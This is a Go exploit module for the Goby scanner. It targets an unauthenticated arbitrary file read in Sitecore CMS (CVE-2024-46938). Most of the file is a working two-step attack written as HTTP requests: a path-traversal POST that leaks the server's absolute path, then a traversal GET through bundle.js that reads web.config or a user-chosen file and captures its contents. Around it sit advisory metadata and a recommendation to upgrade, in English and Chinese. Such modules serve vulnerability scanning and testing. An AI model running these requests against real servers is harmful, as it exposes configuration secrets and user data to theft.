package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Sitecore CMS /-/speak/v1/bundles/bundle.js File Read Vulnerability（CVE-2024-46938）",
    "Description": "<p>Sitecore CMS is an online marketing content management system (CMS) developed by Sitecore, a Danish company. It supports content editing, multi-language, multi-site deployment, and digital asset management. This vulnerability allows unauthenticated attackers to read files on the server through specially crafted HTTP requests, potentially leading to sensitive information disclosure, including server configuration files and user data.</p>",
    "Product": "Sitecore CMS",
    "Homepage": "https://www.sitecore.com/",
    "DisclosureDate": "2024-09-25",
    "PostTime": "2024-12-05",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "title=\"SiteCore\" && body=\"SiteCore\" ",
    "GobyQuery": "title=\"SiteCore\" && body=\"SiteCore\" ",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to read files on the server, potentially leading to sensitive information disclosure, including server configuration files and user data, thereby increasing the risk of further attacks.</p>",
    "Recommendation": "<p>It is recommended to upgrade to the latest version of Sitecore CMS immediately, ensuring that all security patches are applied. Additionally, restrict access to sensitive files and enable strict access control policies on the web server.</p>",
    "References": [
        "https://www.seebug.org/vuldb/ssvid-99900"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "textarea",
            "value": "web.config",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "web.config",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/-/xaml/Sitecore.Shell.Applications.ContentEditor.Dialogs.EditHtml.ValidateXHtml?hdl=a",
                "follow_redirect": true,
                "header": {
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept": "*/*",
                    "Accept-Language": "en-US;q=0.9,en;q=0.8",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36",
                    "Cache-Control": "max-age=0",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "__PAGESTATE=/../../{{{rand_str}}}/"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Could not find a part of the path",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "Absolute_Path|lastbody|regex|Could not find a part of the path '([^'\"]+){{{rand_str}}}"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/-/speak/v1/bundles/bundle.js?f={{{Absolute_Path}}}sitecore\\shell\\client\\..\\..\\..\\web.config%23.js",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<configuration>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/-/xaml/Sitecore.Shell.Applications.ContentEditor.Dialogs.EditHtml.ValidateXHtml?hdl=a",
                "follow_redirect": true,
                "header": {
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept": "*/*",
                    "Accept-Language": "en-US;q=0.9,en;q=0.8",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36",
                    "Cache-Control": "max-age=0",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "__PAGESTATE=/../../{{{rand_str}}}/"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Could not find a part of the path",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "Absolute_Path_Exp|lastbody|regex|Could not find a part of the path '([^'\"]+){{{rand_str}}}"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/-/speak/v1/bundles/bundle.js?f={{{Absolute_Path_Exp}}}sitecore\\shell\\client\\..\\..\\..\\{{{fileName}}}%23.js",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2024-46938"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "Sitecore CMS /-/speak/v1/bundles/bundle.js 文件读取漏洞（CVE-2024-46938）",
            "Product": "Sitecore CMS",
            "Description": "<p>Sitecore CMS 是丹麦 Sitecore 公司开发的一套在线营销内容管理系统（CMS），支持内容编辑、多语言、多网站部署及数字资产管理等功能。该漏洞允许未经身份验证的攻击者通过特制的 HTTP 请求读取服务器上的文件，可能导致敏感信息泄露，包括服务器配置文件、用户数据等。</p>",
            "Recommendation": "<p>建议立即升级到最新版本的 Sitecore CMS，确保所有安全补丁已应用。同时，限制对敏感文件的访问权限，并在 Web 服务器上启用严格的访问控制策略。</p>",
            "Impact": "<p>该漏洞允许攻击者读取服务器上的文件，可能导致敏感信息泄露，包括服务器配置文件、用户数据等，从而进一步加剧攻击风险。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Sitecore CMS /-/speak/v1/bundles/bundle.js File Read Vulnerability（CVE-2024-46938）",
            "Product": "Sitecore CMS",
            "Description": "<p>Sitecore CMS is an online marketing content management system (CMS) developed by Sitecore, a Danish company. It supports content editing, multi-language, multi-site deployment, and digital asset management. This vulnerability allows unauthenticated attackers to read files on the server through specially crafted HTTP requests, potentially leading to sensitive information disclosure, including server configuration files and user data.</p>",
            "Recommendation": "<p>It is recommended to upgrade to the latest version of Sitecore CMS immediately, ensuring that all security patches are applied. Additionally, restrict access to sensitive files and enable strict access control policies on the web server.</p>",
            "Impact": "<p>This vulnerability allows attackers to read files on the server, potentially leading to sensitive information disclosure, including server configuration files and user data, thereby increasing the risk of further attacks.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "fileName": "switch|attackType|{{{default}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/-/speak/v1/bundles/bundle.js",
        "rand_str": "define|variable|{{{rand|str|8}}}"
    },
    "VariablesOrder": [
        "fileName",
        "vulurl",
        "rand_str"
    ],
    "EditType": "fast",
    "PocId": "9975"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}